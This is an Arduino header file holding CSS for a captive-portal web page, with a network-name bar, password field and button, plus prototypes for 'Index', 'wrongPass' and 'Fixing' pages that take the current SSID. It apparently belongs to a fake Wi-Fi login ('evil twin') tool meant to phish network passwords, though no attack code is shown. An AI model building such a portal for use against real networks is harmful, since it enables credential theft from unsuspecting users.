#include "Arduino.h"
#ifndef PORTAL_PAGES_H
#define PORTAL_PAGES_H

const char CSS[] PROGMEM = 
  "body {"
    "font-family: Arial, sans-serif;"
    "background-color: #f2f2f2;"
    "margin: 0;"
    "min-height: 100vh;"
    "display: flex;"
    "flex-direction: column;"
    "align-items: center;"
  "}"
  
  "#networkBar {"
    "background-color: #007bff;"
    "color: #fff;"
    "padding: 15px 0;"
    "width: 70vw;"
    "margin-top: 10px;"
    "border-radius: 8px;"
    "text-align: left;"
  "}"
  
  "#networkName {"
    "font-weight: bold;"
    "padding: 0 20px;"
  "}"
  
  "#content {"
    "display: flex;"
    "flex-direction: column;"
    "justify-content: center;"
    "width: 70vw;"
    "padding: 75px 65px;"
    "box-sizing: border-box;"
    "background-color: #fff;"
    "border-radius: 8px;"
    "box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);"
    "text-align: left;"
    "margin: 15px 100px;"
  "}"
  
  "input[type='password'] {"
    "width: 80%;"
    "padding: 15px;"
    "border: 1px solid #ccc;"
    "border-radius: 5px;"
    "font-size: 16px;"
    "margin-bottom: 20px;"
  "}"
  
  "button {"
    "background-color: #1d6db5;"
    "color: #fff;"
    "border: none;"
    "padding: 15px 0;"
    "border-radius: 5px;"
    "cursor: pointer;"
    "font-size: 18px;"
    "width: 80%;"
    "margin-bottom: 20px;"
  "}"
  
  "form {"
    "margin-top: 20px;" 
    "display: flex;"
    "align-items: center;"
  "}"

  "#pc-center {"
    "display: flex;"
    "flex-direction: column;"
    "justify-content: center;"
    "align-items: center;"
    "min-height: 90vh;"
  "}"
  
  "h1, #networkName {"
    "font-size: 32px;"
  "}"

  "@media screen and (min-height: 950px) {"
    "#content {"
        "padding: 85px 75px;"
        "font-size: 26px;"
        "width: 96vw;"
        "margin: 15px 0;"
    "}"

    "input[type='password'], button {"
        "width: 100%;" 
        "font-size: 24px;"
        "margin-left: 0;"
    "}"

    "#networkBar {"
      "width: 96vw;"
      "padding: 17px 0;"
    "}"

    "form {"
      "flex-direction: column;"
      "align-items: center;"
    "}"

    "h1, #networkName {"
      "font-size: 38px;"
    "}"

  "}"
  
  "button:hover {" 
    "background-color: #0056b3;" 
  "}"

  "p {"
    "margin: 5px 0 0 0;"
    "line-height: 1.3;"
  "}";

String wrongPass(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS);
String Index(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS);
String Fixing(const String& indexLang, const String& favicon, const String& currentSSID, const String& indexCSS);

#endif
